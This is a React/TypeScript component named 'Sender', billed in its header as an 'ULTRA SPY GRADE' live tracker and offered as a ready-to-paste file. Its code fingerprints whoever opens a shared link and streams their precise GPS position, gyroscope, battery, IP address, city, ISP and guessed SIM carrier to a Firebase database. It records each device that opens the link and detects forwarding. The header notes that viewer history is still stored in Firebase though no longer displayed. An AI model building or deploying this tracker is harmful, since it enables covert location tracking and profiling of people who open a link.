/**
 * ██████████████████████████████████████████████████████████████
 * SENDER COMPONENT – LIVE TRACKER (v7.5 – ULTRA SPY GRADE + FORWARD DETECTION)
 * 
 * ✅ FIXED: All previous runtime errors (_checkNotDeleted)
 * ✅ FIXED: Key prop warning (removed the entire viewer list UI)
 * ✅ REMOVED: 👥 Devices That Opened This Link history section + modal
 *    (Data is still saved to Firebase exactly as before – just not displayed here)
 * ✅ Kept: Forward detection banner (still shows if link was forwarded)
 * ✅ Kept: All live tracking (GPS, gyro, battery, network, ISP, SIM, device info, heartbeat, etc.)
 * ✅ Hydration mismatch error is NOT from this file – it's caused by a browser extension
 *    injecting attributes (bis_register, __processed_...) into <body>.
 *    Fix: Disable extensions temporarily or add suppressHydrationWarning={true}
 *    to the <body> tag in your app/layout.tsx
 * 
 * Just copy-paste this entire file into nav-app\components\Sender.tsx
 * ██████████████████████████████████████████████████████████████
 */

"use client";

import { useEffect, useRef, useState } from "react";
import { db } from "@/lib/firebase";
import {
  ref,
  update,
  onDisconnect,
  onValue,
} from "firebase/database";
import {
  getDeviceInfo,
  startLiveOrientation,
  startLiveBattery,
  type DeviceInfo,
} from "@/lib/deviceDetector";

/* ---------------- TYPES ---------------- */

type Coords = {
  lat: number;
  lng: number;
  accuracy: number;
};

type IPInfo = {
  ip?: string;
  city?: string;
  region?: string;
  country?: string;
  isp?: string;
  as?: string;
};

type SimInfo = {
  carrier?: string;
  confidence?: number;
  method?: string;
};

type BatteryInfo = {
  level?: number;
  charging?: boolean;
  chargingTime?: number | null;
  dischargingTime?: number | null;
};

type NetworkInfo = {
  effectiveType?: string;
  downlink?: number;
  rtt?: number;
  saveData?: boolean;
  isp?: string;
  ipInfo?: IPInfo;
};

type OrientationData = {
  alpha?: number;
  beta?: number;
  gamma?: number;
  timestamp: number;
};

type Viewer = {
  viewerId: string;
  openedAt: number;
  lastSeen: number;
  device: DeviceInfo;
  coords?: Coords;
};

type Props = {
  sessionId: string;
};

/* ---------------- SANITIZER ---------------- */
const removeUndefined = (obj: any): any => {
  if (obj == null || typeof obj !== "object") return obj;
  if (Array.isArray(obj)) {
    return obj.map(removeUndefined).filter((v) => v !== undefined);
  }
  const cleaned: Record<string, any> = {};
  Object.keys(obj).forEach((key) => {
    const value = removeUndefined(obj[key]);
    if (value !== undefined) {
      cleaned[key] = value;
    }
  });
  return cleaned;
};

export default function Sender({ sessionId }: Props) {
  const watchIdRef = useRef<number | null>(null);
  const heartbeatRef = useRef<NodeJS.Timeout | null>(null);
  const lastGpsUpdate = useRef<number>(0);
  const stopLiveOrientationRef = useRef<(() => void) | null>(null);
  const stopLiveBatteryRef = useRef<(() => void) | null>(null);
  const myViewerIdRef = useRef<string>("");

  /* Firebase refs (created safely only on client) */
  const sessionRef = useRef<any>(null);
  const viewersRef = useRef<any>(null);
  const connectedRef = useRef<any>(null);

  const [status, setStatus] = useState<"initializing" | "online" | "offline" | "error">("initializing");
  const [coords, setCoords] = useState<Coords | null>(null);
  const [ping, setPing] = useState<number>(0);
  const [device, setDevice] = useState<DeviceInfo | null>(null);
  const [network, setNetwork] = useState<NetworkInfo | null>(null);
  const [battery, setBattery] = useState<BatteryInfo | null>(null);
  const [sim, setSim] = useState<SimInfo | null>(null);
  const [gyroActive, setGyroActive] = useState(false);

  /* We still listen to viewers ONLY for the forward-detection banner */
  const [viewersCount, setViewersCount] = useState(0);

  /* ---------------- FETCH ISP + SIM ---------------- */
  const fetchNetworkData = async (connectionType = "unknown", effectiveType = "unknown") => {
    try {
      const params = new URLSearchParams({ connectionType, effectiveType }).toString();
      const res = await fetch(`/api/isp?${params}`, { cache: "no-store" });
      if (!res.ok) throw new Error("ISP API failed");
      return await res.json();
    } catch (err) {
      console.error("ISP fetch failed:", err);
      return null;
    }
  };

  /* ---------------- UNIQUE VIEWER ID ---------------- */
  const generateViewerId = (dev: DeviceInfo): string => {
    const fp = `${dev.canvasFingerprint || ""}-${dev.webglFingerprint || ""}-${dev.audioFingerprint || ""}`;
    return btoa(fp + Date.now())
      .replace(/[^a-zA-Z0-9]/g, "")
      .slice(0, 16);
  };

  /* ---------------- INIT ---------------- */
  useEffect(() => {
    if (!sessionId || !navigator.geolocation) {
      setStatus("error");
      return;
    }

    /* Create Firebase references ONLY on client */
    sessionRef.current = ref(db, `sessions/${sessionId}`);
    viewersRef.current = ref(db, `sessions/${sessionId}/viewers`);
    connectedRef.current = ref(db, ".info/connected");

    /* 1. DEVICE INFO + CREATE VIEWER RECORD */
    (async () => {
      try {
        const info = await getDeviceInfo();
        setDevice(info);

        const viewerId = generateViewerId(info);
        myViewerIdRef.current = viewerId;

        const viewerData: Partial<Viewer> = {
          viewerId,
          openedAt: Date.now(),
          lastSeen: Date.now(),
          device: info,
        };

        await update(ref(db, `sessions/${sessionId}/viewers/${viewerId}`), removeUndefined(viewerData));
        await update(sessionRef.current, removeUndefined({ device: info }));
      } catch (err) {
        console.error("Device info capture failed:", err);
      }
    })();

    /* 2. LIVE GYROSCOPE */
    stopLiveOrientationRef.current = startLiveOrientation((gyro) => {
      const orientationData: OrientationData = {
        alpha: gyro.alpha,
        beta: gyro.beta,
        gamma: gyro.gamma,
        timestamp: Date.now(),
      };

      update(sessionRef.current, removeUndefined({ orientation: orientationData, lastSeen: Date.now() }));

      if (myViewerIdRef.current) {
        update(
          ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`),
          removeUndefined({ orientation: orientationData, lastSeen: Date.now() })
        );
      }

      setGyroActive(true);
    });

    /* 3. LIVE BATTERY */
    stopLiveBatteryRef.current = startLiveBattery((bat) => {
      const batInfo: BatteryInfo = {
        level: bat.batteryLevel,
        charging: bat.isCharging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime,
      };
      setBattery(batInfo);

      update(sessionRef.current, removeUndefined({ battery: batInfo }));

      if (myViewerIdRef.current) {
        update(
          ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`),
          removeUndefined({ battery: batInfo, lastSeen: Date.now() })
        );
      }
    });

    /* 4. NETWORK + ISP */
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;

    const baseNetwork: NetworkInfo = conn
      ? {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData,
        }
      : {};

    setNetwork(baseNetwork);

    const runNetwork = async () => {
      const data = await fetchNetworkData(conn?.type || "unknown", conn?.effectiveType || "unknown");
      if (!data) return;

      const net: NetworkInfo = {
        ...baseNetwork,
        isp: data.isp,
        ipInfo: {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          isp: data.isp,
          as: data.as,
        },
      };

      const simData: SimInfo = data.sim || null;

      setNetwork(net);
      setSim(simData);
      update(sessionRef.current, removeUndefined({ network: net, sim: simData }));
    };

    runNetwork();

    /* 5. PRESENCE + HEARTBEAT + GPS */
    onValue(connectedRef.current, (snap) => {
      if (snap.val()) {
        update(sessionRef.current, { status: "online", lastSeen: Date.now() });
        onDisconnect(sessionRef.current).update({ status: "offline", lastSeen: Date.now() });
        setStatus("online");
      } else {
        setStatus("offline");
      }
    });

    heartbeatRef.current = setInterval(async () => {
      const start = Date.now();
      try {
        await update(sessionRef.current, { heartbeat: start });
        const pingTime = Date.now() - start;
        setPing(pingTime);
        update(sessionRef.current, { pingMs: pingTime, lastSeen: Date.now() });

        if (myViewerIdRef.current) {
          update(ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`), { lastSeen: Date.now() });
        }
      } catch {
        setPing(999);
      }
    }, 8000);

    watchIdRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        const now = Date.now();
        if (now - lastGpsUpdate.current < 2000) return;
        lastGpsUpdate.current = now;

        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
        const newCoords = { lat, lng, accuracy };
        setCoords(newCoords);
        setStatus("online");

        update(sessionRef.current, { lat, lng, accuracy, timestamp: now, lastSeen: now, status: "online" });

        if (myViewerIdRef.current) {
          update(
            ref(db, `sessions/${sessionId}/viewers/${myViewerIdRef.current}`),
            removeUndefined({ coords: newCoords, lastSeen: now })
          );
        }
      },
      () => setStatus("offline"),
      { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
    );

    /* 6. LISTEN TO VIEWERS (only for forward banner count) */
    const unsubscribeViewers = onValue(viewersRef.current, (snap) => {
      const data = snap.val() as Record<string, Viewer> | null;
      setViewersCount(data ? Object.keys(data).length : 0);
    });

    /* CLEANUP */
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
      if (stopLiveOrientationRef.current) stopLiveOrientationRef.current();
      if (stopLiveBatteryRef.current) stopLiveBatteryRef.current();
      if (unsubscribeViewers) unsubscribeViewers();
      if (sessionRef.current) update(sessionRef.current, { status: "offline", lastSeen: Date.now() });
    };
  }, [sessionId]);

  /* ---------------- HELPERS ---------------- */
  const isForwarded = viewersCount > 1;

  const formatTime = (ts: number) => {
    const diff = Date.now() - ts;
    const sec = Math.floor(diff / 1000);
    if (sec < 60) return `${sec}s ago`;
    if (sec < 3600) return `${Math.floor(sec / 60)}m ago`;
    return `${Math.floor(sec / 3600)}h ago`;
  };

  /* ---------------- UI ---------------- */
  return (
    <div style={styles.container}>
      <h3>📡 Live Sender (v7.5 – Forward Detection Enabled)</h3>

      {/* Forward Detection Banner */}
      <div
        style={{
          padding: 12,
          borderRadius: 12,
          background: isForwarded ? "#ef4444" : "#22c55e",
          color: "white",
          marginBottom: 16,
          textAlign: "center",
          fontWeight: 700,
        }}
      >
        {isForwarded
          ? `🚨 LINK FORWARDED – ${viewersCount} devices opened this link`
          : `✅ Only you have opened this link so far`}
      </div>

      <p>
        Status: <strong>{status}</strong> • Ping: {ping} ms
      </p>

      {gyroActive && <p style={{ color: "#10b981", fontWeight: 600 }}>📡 Gyroscope LIVE (real-time tilt tracking)</p>}

      {coords && (
        <p>
          📍 GPS: {coords.lat.toFixed(4)}, {coords.lng.toFixed(4)} (±{Math.round(coords.accuracy)}m)
        </p>
      )}

      {network?.ipInfo && (
        <div style={{ marginTop: 12 }}>
          <p>🌐 IP: {network.ipInfo.ip}</p>
          <p>📍 City: {network.ipInfo.city}</p>
          <p>🌍 Country: {network.ipInfo.country}</p>
          <p style={{ fontWeight: 600 }}>ISP: {network.isp}</p>
        </div>
      )}

      {sim && (
        <div style={{ marginTop: 12 }}>
          <p style={{ fontWeight: 600 }}>📶 SIM: {sim.carrier || "Unknown"}</p>
          <p style={{ opacity: 0.7 }}>
            Confidence: {sim.confidence}%{" "}
            {sim.method && <span style={{ fontSize: "0.8em", marginLeft: 8 }}>({sim.method})</span>}
          </p>
        </div>
      )}

      {battery && (
        <p>
          🔋 Battery: {battery.level !== undefined ? Math.round(battery.level * 100) : "?"}%
          {battery.charging ? " ⚡ charging" : ""}
          {battery.chargingTime !== null && battery.charging && (
            <span style={{ marginLeft: 8, fontSize: 13 }}>
              (full in ~{Math.round((battery.chargingTime || 0) / 60)} min)
            </span>
          )}
        </p>
      )}

      {device && (
        <div style={{ marginTop: 12 }}>
          <p>
            📱 Device: <strong>{device.brand} {device.model}</strong>
          </p>
          <p>OS: {device.os} {device.osVersion || ""}</p>
        </div>
      )}
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  container: {
    padding: 20,
    background: "#0f172a",
    color: "white",
    borderRadius: 16,
    maxWidth: 460,
    margin: "20px auto",
    fontFamily: "system-ui, sans-serif",
    lineHeight: 1.6,
    boxShadow: "0 10px 30px rgba(0,0,0,0.3)",
  },
};